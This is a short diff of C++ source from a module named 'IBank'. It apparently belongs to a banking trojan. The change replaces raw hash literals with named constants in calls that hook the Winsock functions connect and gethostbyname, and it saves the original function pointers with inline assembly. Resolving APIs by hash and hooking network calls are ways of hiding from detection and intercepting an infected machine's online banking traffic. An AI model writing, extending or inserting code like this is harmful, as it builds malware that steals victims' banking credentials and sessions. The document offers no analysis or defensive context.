@@ -220,14 +220,16 @@ namespace IBank
 
 		// Ставим хук на подключение к серверу, для определения момента закрыти
 		// системы
-		if ( HookApi( 4, 0xedd8fe8a, &Hook_Connect ) )
+		const DWORD HASH_connect = 0xedd8fe8a;
+		if ( HookApi( DLL_WINSOCK, HASH_connect, &Hook_Connect ) )
 		{
 			__asm mov [Real_Connect], eax
 		}
 
 
 		#ifdef JAVS_PATCHERH
-		if ( HookApi( 4, 0xF44318C6 /* gethostbyname */, &Hook_gethostbyname) )
+		const DWORD HASH_gethostbyname = 0xF44318C6;
+		if ( HookApi( DLL_WINSOCK, HASH_gethostbyname, &Hook_gethostbyname) )
 		{
 			__asm mov [Real_gethostbyname], eax
 		}
